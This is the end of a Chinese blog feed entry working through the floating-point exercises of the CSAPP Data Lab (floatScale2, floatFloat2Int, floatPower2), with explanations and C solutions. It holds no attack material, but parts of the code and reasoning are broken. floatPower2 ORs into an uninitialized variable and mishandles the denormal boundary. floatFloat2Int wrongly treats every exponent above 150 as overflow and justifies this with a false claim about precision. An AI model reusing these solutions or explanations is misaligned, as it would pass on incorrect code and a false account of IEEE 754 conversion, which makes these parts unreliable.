uf 为非规格化数，即阶码为 0 时，此时 uf 的值完全由尾数来表示，且不含隐含 0，因此乘二相当于将尾数乘二，即左移 1 位。</p><p>需要注意的是，当 uf 为非规格化数且尾数最高位为 1 时，尾数左移会导致最高位的 1 移动到阶码的最低位。但经过验证，此时的结果仍然符合预期，即非规格化数无缝衔接到了规格化数，不禁感叹 IEEE 754 标准浮点数的设计之精妙。</p><h2 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">floatScale2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> uf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> t <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>  <span class="token comment">// 阶码</span>    <span class="token keyword">unsigned</span> m <span class="token operator">=</span> uf <span class="token operator">&amp;</span> <span class="token number">0x7fffff</span><span class="token punctuation">;</span>      <span class="token comment">// 尾数</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token keyword">return</span> uf<span class="token punctuation">;</span>        <span class="token comment">// 无穷大或者 NaN</span>    <span class="token comment">// 非规格化数</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        m <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>        uf <span class="token operator">&amp;=</span> <span class="token number">0xff800000</span><span class="token punctuation">;</span>        uf <span class="token operator">|=</span> m<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 规格化数</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        t <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        uf <span class="token operator">&amp;=</span> <span class="token number">0x807fffff</span><span class="token punctuation">;</span>        uf <span class="token operator">|=</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> uf<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h1><h2 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h2><p>首先确定整数所能表示的上下界的值：当阶码小于 127，即指数位小于 0 时，此时浮点数 uf 小于 1，对应的整数为 0；当阶码大于 150，即指数位大于 23 时，此时单精度浮点数的精度（尾数长度）不足以正确表示对应的整数，返回 0x80000000。</p><p>对于在合理范围内的 uf，将其转换为对应的整数，首先需要尾数最高位的高一位加上规格化数隐含的 1，再根据阶码的大小将尾数进行右移，阶码越大，右移位数越少。最后根据符号位的值选择是否将结果取反加一。</p><h2 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">floatFloat2Int</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> uf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> s <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">;</span>   <span class="token comment">// 符号</span>    <span class="token keyword">unsigned</span> t <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>  <span class="token comment">// 阶码</span>    <span class="token keyword">unsigned</span> m <span class="token operator">=</span> uf <span class="token operator">&amp;</span> <span class="token number">0x7fffff</span><span class="token punctuation">;</span>      <span class="token comment">// 尾数</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    <span class="token comment">// 小于 1</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 大于 1 且不溢出</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;=</span> <span class="token number">150</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> m <span class="token operator">|</span> <span class="token number">0x800000</span><span class="token punctuation">;</span>        val <span class="token operator">>>=</span> <span class="token punctuation">(</span><span class="token number">23</span> <span class="token operator">-</span> <span class="token punctuation">(</span>t <span class="token operator">-</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            val <span class="token operator">=</span> <span class="token operator">~</span>val <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 溢出</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0x80000000</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> val<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h1><h2 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h2><p>同样是对规格化数和非规格化数的分类讨论：</p><p>当 <code>x &gt;= -150 &amp;&amp; x &lt; -127</code> 时，结果为非规格化数，此时浮点数表示只有一个位为 1，其余全为 0。直接根据指数 x 的值确定该位的位置即可。</p><p>当 <code>x &gt;= -127 &amp;&amp; x &lt; 128</code> 时，结果为规格化数，此时浮点数表示的尾数全为 0，只有阶码用来表示指数的值。根据指数 x 的值确定阶码的值，然后构造出浮点数即可。</p><h2 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">floatPower2</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> val<span class="token punctuation">;</span>    <span class="token comment">// 太小</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">150</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 非规格化数</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">150</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 规格化数</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">unsigned</span> t <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">127</span><span class="token punctuation">;</span>        val <span class="token operator">|=</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 太大</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0x7f800000</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> val<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;CSAPP 的第一个 Lab，对应知识点为书中的第 2 章（信息的表示与处理），要求使用受限制的运算符和表达式实现一些位操作。主要分为两个部分：整数部分和浮点数部分。其中整数部分限制较多，比较偏重技巧性，部分题个人认为很有难度。而浮点数部分则比较基础，主要考察对 IEEE 754 标准的熟悉程度，代码较长，但思路相对简单。&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="位运算" scheme="http://lordaeronesz.github.io/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"/>
    
  </entry>
  
</feed>
